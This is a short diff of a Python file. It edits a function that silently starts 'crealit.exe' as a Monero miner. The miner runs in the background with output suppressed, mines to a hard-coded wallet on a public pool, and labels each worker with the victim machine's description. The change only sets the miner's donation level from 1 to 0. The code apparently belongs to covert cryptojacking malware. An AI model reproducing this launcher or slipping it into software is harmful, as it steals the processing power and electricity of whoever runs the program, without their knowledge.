@@ -218,7 +218,7 @@ def get_computer_description():
 
 
 def ligar_crealit():
-    subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 --background', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 0 --background', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 
